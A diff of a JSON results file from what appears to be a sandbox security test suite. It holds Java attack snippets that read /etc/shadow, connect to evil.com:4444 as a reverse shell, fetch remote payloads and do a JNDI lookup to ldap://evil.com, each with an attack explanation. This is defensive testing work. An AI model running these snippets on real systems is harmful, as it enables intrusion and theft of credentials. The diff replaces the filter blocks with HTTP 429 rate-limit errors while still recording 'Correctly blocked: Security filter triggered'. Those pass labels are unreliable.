       "explanation": "\n      🎯 ATTACK: Runtime Command Execution\n      \n      How hackers use this:\n      Runtime.exec() is Java's primary method for executing system commands.\n      It creates a native process to run the specified command.\n      \n      Real-world impact:\n      - Execute any shell command\n      - Download and run malware\n      - Reverse shells\n      - Data exfiltration\n      \n      Historical note:\n      This is the most common Java RCE vector, found in countless CVEs\n      including Struts2, Log4Shell exploitation chains, and many more.\n    "
@@ -3798,12 +3803,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) throws Exception {\n    ProcessBuilder pb = new ProcessBuilder(\"ls\", \"-la\");\n    pb.start();\n  }\n}",
       "explanation": "\n      🎯 ATTACK: ProcessBuilder Command Execution\n      \n      How hackers use this:\n      ProcessBuilder provides more control over process creation than Runtime.exec().\n      It allows setting environment, directory, and I/O redirection.\n      \n      Real-world impact:\n      - More powerful than Runtime.exec()\n      - Control environment variables\n      - Redirect stdin/stdout for interactive shells\n      - Chain commands together\n    "
@@ -3818,9 +3823,9 @@
       "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) throws Exception {\n    new ProcessBuilder().command(\"cat\", \"/etc/passwd\").start();\n  }\n}",
       "explanation": "\n      🎯 ATTACK: ProcessBuilder Command Method\n      \n      How hackers use this:\n      The command() method sets the command to execute.\n      Commonly used with .start() for process creation.\n      \n      Real-world impact:\n      - Same as constructor-based ProcessBuilder\n      - More readable for complex commands\n      - Common in real-world exploits\n    "
@@ -3832,12 +3837,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.io.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    FileInputStream fis = new FileInputStream(\"/etc/passwd\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: File Reading via FileInputStream\n      \n      How hackers use this:\n      FileInputStream provides direct file access.\n      Used to read sensitive files like configurations and credentials.\n      \n      Real-world impact:\n      - Read /etc/passwd, /etc/shadow\n      - Access application config files\n      - Steal private keys and certificates\n      - Read environment files\n    "
@@ -3852,9 +3857,9 @@
       "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.io.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    FileOutputStream fos = new FileOutputStream(\"/tmp/evil.sh\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: File Writing via FileOutputStream\n      \n      How hackers use this:\n      FileOutputStream creates or overwrites files.\n      Used to plant backdoors or modify configurations.\n      \n      Real-world impact:\n      - Write malicious scripts\n      - Create web shells\n      - Modify application code\n      - Plant SSH keys for persistence\n    "
@@ -3866,12 +3871,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.io.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    FileReader fr = new FileReader(\"/etc/passwd\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Character-Based File Reading\n      \n      How hackers use this:\n      FileReader is a convenience class for text files.\n      Same file access capabilities as FileInputStream.\n      \n      Real-world impact:\n      - Read text-based config files\n      - Alternative to FileInputStream\n      - More suitable for character data\n    "
@@ -3883,12 +3888,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.io.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    FileWriter fw = new FileWriter(\"/tmp/malware.txt\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Character-Based File Writing\n      \n      How hackers use this:\n      FileWriter provides text file writing.\n      Same file creation capabilities as FileOutputStream.\n      \n      Real-world impact:\n      - Write configuration files\n      - Create script files\n      - Alternative to FileOutputStream for text\n    "
@@ -3900,12 +3905,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.io.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    RandomAccessFile raf = new RandomAccessFile(\"/etc/passwd\", \"r\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Random Access File Operations\n      \n      How hackers use this:\n      RandomAccessFile allows reading/writing at any position.\n      Useful for modifying specific parts of files.\n      \n      Real-world impact:\n      - Read specific sections of files\n      - Patch binaries or configs\n      - Append to log files\n    "
@@ -3920,9 +3925,9 @@
       "duration": 3,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.nio.file.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    byte[] data = Files.readAllBytes(Paths.get(\"/etc/passwd\"));\n  }\n}",
       "explanation": "\n      🎯 ATTACK: NIO Files Reading\n      \n      How hackers use this:\n      java.nio.file.Files provides modern file operations.\n      readAllBytes() is a convenient one-liner for file theft.\n      \n      Real-world impact:\n      - Modern alternative to FileInputStream\n      - Complete file content in one call\n      - Easy to exfiltrate\n    "
@@ -3934,12 +3939,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.nio.file.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    Files.write(Paths.get(\"/tmp/evil.txt\"), \"malicious\".getBytes());\n  }\n}",
       "explanation": "\n      🎯 ATTACK: NIO Files Writing\n      \n      How hackers use this:\n      Files.write() creates or overwrites files with provided content.\n      Modern and concise API for file creation.\n      \n      Real-world impact:\n      - Quick file creation\n      - Easy backdoor deployment\n      - Modern NIO API\n    "
@@ -3951,12 +3956,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 5,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.nio.file.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    var is = Files.newInputStream(Paths.get(\"/etc/shadow\"));\n  }\n}",
       "explanation": "\n      🎯 ATTACK: NIO InputStream Creation\n      \n      How hackers use this:\n      Files.newInputStream() creates an InputStream for NIO paths.\n      Bridges NIO paths with traditional I/O streams.\n      \n      Real-world impact:\n      - Access restricted files\n      - NIO path handling\n      - Stream-based processing\n    "
@@ -3968,12 +3973,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 27,
+      "duration": 49,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.net.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    Socket s = new Socket(\"evil.com\", 4444);\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Raw Socket Connection (Reverse Shell)\n      \n      How hackers use this:\n      Java Sockets enable network connections.\n      Primary method for reverse shells in Java.\n      \n      Real-world impact:\n      - Reverse shell connections\n      - Data exfiltration\n      - C2 communication\n      - Port scanning\n      \n      Classic pattern:\n      Socket → redirect I/O → Runtime.exec(\"/bin/sh\")\n    "
@@ -3985,12 +3990,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 6,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.net.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    ServerSocket ss = new ServerSocket(9999);\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Bind Shell / Listener\n      \n      How hackers use this:\n      ServerSocket creates a listening port.\n      Used for bind shells where attacker connects to victim.\n      \n      Real-world impact:\n      - Bind shell backdoors\n      - Internal service creation\n      - Proxy/tunnel endpoints\n    "
@@ -4002,12 +4007,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 1,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.net.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    URL url = new URL(\"https://evil.com/payload\");\n    url.openConnection();\n  }\n}",
       "explanation": "\n      🎯 ATTACK: URL-Based Network Access\n      \n      How hackers use this:\n      URL class provides high-level URL operations.\n      Can fetch remote content or exfiltrate data.\n      \n      Real-world impact:\n      - Download malware payloads\n      - Exfiltrate data via HTTP\n      - SSRF attacks\n    "
@@ -4019,12 +4024,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 8,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.net.http.*;\nimport java.net.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    HttpClient client = HttpClient.newHttpClient();\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Modern HTTP Client\n      \n      How hackers use this:\n      java.net.http.HttpClient is the modern HTTP API (Java 11+).\n      Clean API for HTTP requests.\n      \n      Real-world impact:\n      - Modern data exfiltration\n      - Clean HTTP communication\n      - Async request capabilities\n    "
@@ -4036,12 +4041,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 11,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.net.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    URLClassLoader cl = new URLClassLoader(new URL[]{new URL(\"http://evil.com/\")});\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Remote Class Loading\n      \n      How hackers use this:\n      URLClassLoader can load classes from remote URLs.\n      Downloads and executes attacker-provided code.\n      \n      Real-world impact:\n      - Download and execute remote Java classes\n      - Classic RCE technique\n      - Bypasses code review (code is remote)\n    "
@@ -4053,12 +4058,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 71,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.lang.reflect.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    Method m = Runtime.class.getMethod(\"exec\", String.class);\n    m.invoke(Runtime.getRuntime(), \"id\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Reflection-Based Command Execution\n      \n      How hackers use this:\n      Reflection allows calling methods dynamically by name.\n      Bypasses compile-time security checks.\n      \n      Real-world impact:\n      - Call private/protected methods\n      - Bypass security managers\n      - Dynamic payload construction\n      - Core of many Java exploits\n    "
@@ -4070,12 +4075,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 8,
+      "duration": 3,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) throws Exception {\n    Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class);\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Dynamic Class Loading\n      \n      How hackers use this:\n      Class.forName() loads classes by name at runtime.\n      First step in reflection-based attacks.\n      \n      Real-world impact:\n      - Load any class dynamically\n      - String-based class references bypass static analysis\n      - Foundation for reflection exploits\n    "
@@ -4090,9 +4095,9 @@
       "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.lang.reflect.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    Field f = System.class.getDeclaredField(\"security\");\n    f.setAccessible(true);\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Access Control Bypass\n      \n      How hackers use this:\n      setAccessible(true) bypasses Java's access controls.\n      Enables access to private fields and methods.\n      \n      Real-world impact:\n      - Access private fields\n      - Modify final fields\n      - Disable SecurityManager\n      - Escalate privileges\n    "
@@ -4104,12 +4109,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 12,
+      "duration": 1,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.lang.invoke.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    MethodHandles.Lookup lookup = MethodHandles.lookup();\n  }\n}",
       "explanation": "\n      🎯 ATTACK: MethodHandle Reflection\n      \n      How hackers use this:\n      MethodHandles is a modern reflection API.\n      Often bypasses security checks better than traditional reflection.\n      \n      Real-world impact:\n      - Alternative reflection mechanism\n      - May bypass SecurityManager\n      - Invoke private methods\n      - Used in advanced exploits\n    "
@@ -4121,12 +4126,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.lang.invoke.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    VarHandle vh;\n  }\n}",
       "explanation": "\n      🎯 ATTACK: VarHandle Field Access\n      \n      How hackers use this:\n      VarHandle provides direct field access with minimal overhead.\n      Modern alternative to Field reflection.\n      \n      Real-world impact:\n      - Low-level field manipulation\n      - Atomic operations on any field\n      - Bypass encapsulation\n    "
@@ -4138,12 +4143,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.io.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    ObjectInputStream ois = new ObjectInputStream(System.in);\n    Object obj = ois.readObject();\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Unsafe Deserialization\n      \n      How hackers use this:\n      ObjectInputStream.readObject() deserializes Java objects.\n      Malicious objects can execute code during deserialization.\n      \n      Real-world impact:\n      - Remote Code Execution via gadget chains\n      - Classic Java deserialization vulnerability\n      - Thousands of CVEs (Apache Commons, WebLogic, etc.)\n      \n      Famous exploits:\n      - Apache Commons Collections gadget chain\n      - WebLogic T3 deserialization\n      - JBoss, Jenkins, and many more\n    "
@@ -4158,9 +4163,9 @@
       "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.beans.*;\nimport java.io.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    XMLDecoder decoder = new XMLDecoder(new FileInputStream(\"malicious.xml\"));\n  }\n}",
       "explanation": "\n      🎯 ATTACK: XML Deserialization\n      \n      How hackers use this:\n      XMLDecoder deserializes Java objects from XML.\n      Malicious XML can create arbitrary objects.\n      \n      Real-world impact:\n      - RCE via XML payloads\n      - Often overlooked in security audits\n      - CVE-2017-3506 (WebLogic)\n    "
@@ -4175,9 +4180,9 @@
       "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import com.thoughtworks.xstream.*;\npublic class Main {\n  public static void main(String[] args) {\n    XStream xstream = new XStream();\n  }\n}",
       "explanation": "\n      🎯 ATTACK: XStream XML Serialization\n      \n      How hackers use this:\n      XStream is a popular XML serialization library.\n      Has had numerous RCE vulnerabilities.\n      \n      Real-world impact:\n      - Multiple CVEs (CVE-2020-26217, CVE-2021-21344, etc.)\n      - Common in enterprise Java apps\n      - XML-based RCE\n    "
@@ -4189,12 +4194,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import org.yaml.snakeyaml.*;\npublic class Main {\n  public static void main(String[] args) {\n    Yaml yaml = new Yaml();\n    yaml.load(\"!!java.lang.Runtime [\"whoami\"]\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: YAML Deserialization\n      \n      How hackers use this:\n      SnakeYAML can instantiate arbitrary classes from YAML.\n      !! prefix specifies class types.\n      \n      Real-world impact:\n      - RCE via YAML payloads\n      - CVE-2022-1471 (SnakeYAML)\n      - Common in Spring applications\n    "
@@ -4206,12 +4211,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import javax.naming.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    InitialContext ctx = new InitialContext();\n    ctx.lookup(\"ldap://evil.com/exploit\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: JNDI Injection (Log4Shell Pattern)\n      \n      How hackers use this:\n      JNDI lookup can load remote objects from LDAP/RMI servers.\n      This is the core of the Log4Shell (CVE-2021-44228) attack.\n      \n      Real-world impact:\n      - Log4Shell - one of the worst vulnerabilities ever\n      - Download and execute remote Java classes\n      - Affects millions of servers\n      \n      Attack flow:\n      1. Attacker injects ${jndi:ldap://evil.com/x}\n      2. Victim server looks up LDAP\n      3. LDAP returns malicious class reference\n      4. Class is loaded and executed\n    "
@@ -4223,12 +4228,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import javax.naming.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    Context ctx = new InitialContext();\n  }\n}",
       "explanation": "\n      🎯 ATTACK: JNDI Context Creation\n      \n      How hackers use this:\n      InitialContext is the gateway to JNDI operations.\n      Required for JNDI-based attacks.\n      \n      Real-world impact:\n      - Prerequisite for JNDI injection\n      - Can be configured for remote lookups\n      - Core JNDI functionality\n    "
@@ -4240,12 +4245,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import javax.script.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"js\");\n    engine.eval(\"java.lang.Runtime.getRuntime().exec('id')\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: JavaScript Engine Command Execution\n      \n      How hackers use this:\n      Java's ScriptEngine can execute JavaScript.\n      JavaScript can access Java classes and execute commands.\n      \n      Real-world impact:\n      - Execute commands via embedded JavaScript\n      - Bypass Java-only security checks\n      - Often overlooked attack vector\n    "
@@ -4257,12 +4262,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 51,
+      "duration": 3,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import javax.script.*;\npublic class Main {\n  public static void main(String[] args) {\n    ScriptEngineManager manager = new ScriptEngineManager();\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Script Engine Access\n      \n      How hackers use this:\n      ScriptEngineManager provides access to scripting engines.\n      Gateway to JavaScript/Groovy/other script execution.\n      \n      Real-world impact:\n      - Access to multiple script engines\n      - Cross-language code execution\n      - Scripting bypass for security\n    "
@@ -4274,12 +4279,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import sun.misc.Unsafe;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    java.lang.reflect.Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n    f.setAccessible(true);\n    Unsafe unsafe = (Unsafe) f.get(null);\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Unsafe Memory Operations\n      \n      How hackers use this:\n      sun.misc.Unsafe provides raw memory access.\n      Bypasses all Java safety mechanisms.\n      \n      Real-world impact:\n      - Arbitrary memory read/write\n      - Create objects without constructors\n      - Bypass security completely\n      - Memory corruption attacks\n    "
@@ -4291,12 +4296,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 1,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.lang.reflect.*;\npublic class Main {\n  public static void main(String[] args) throws Exception {\n    Method m = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Dynamic Class Definition\n      \n      How hackers use this:\n      defineClass() creates new classes from bytecode.\n      Can inject malicious classes at runtime.\n      \n      Real-world impact:\n      - Load attacker's bytecode directly\n      - Bypass class verification\n      - Create classes without .class files\n    "
@@ -4308,12 +4313,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 54,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Evil extends ClassLoader {\n  public Class<?> loadMalicious(byte[] bytes) {\n    return defineClass(null, bytes, 0, bytes.length);\n  }\n}\npublic class Main {\n  public static void main(String[] args) {}\n}",
